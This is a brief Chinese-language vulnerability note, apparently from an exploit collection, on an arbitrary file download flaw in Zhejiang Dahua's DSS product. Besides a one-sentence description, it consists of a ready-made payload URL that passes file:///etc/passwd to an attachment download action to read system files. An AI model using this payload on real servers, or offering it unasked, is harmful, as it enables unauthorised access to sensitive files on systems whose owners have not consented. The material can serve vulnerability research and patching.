<languages />

漏洞简介
--------

浙江大华技术股份有限公司DSS存在任意文件下载漏洞，攻击者可利用该漏洞登录界面下载任意文件获取敏感信息。

Payload
-------

    http://ip/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd